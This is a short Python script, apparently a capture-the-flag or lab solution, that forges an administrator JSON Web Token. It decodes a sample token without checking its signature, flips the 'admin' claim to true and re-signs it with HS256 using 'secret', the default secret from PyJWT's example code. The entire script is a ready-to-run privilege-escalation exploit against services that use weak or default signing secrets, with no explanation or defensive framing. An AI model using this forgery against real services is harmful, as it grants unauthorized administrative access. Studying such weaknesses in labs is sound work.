token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImhlbGxvIiwiYWRtaW4iOmZhbHNlfQ.75l84Zk5UtUzU7z_Fd_841pvo7-5iCmuqT1jEcLrBcI"

import jwt

body = jwt.decode(token, options={"verify_signature": False})
body['admin'] = True

# The secret in the example of the repo of PyJWT (https://github.com/jpadilla/pyjwt) is "secret"
print(jwt.encode(body, "secret", algorithm='HS256'))

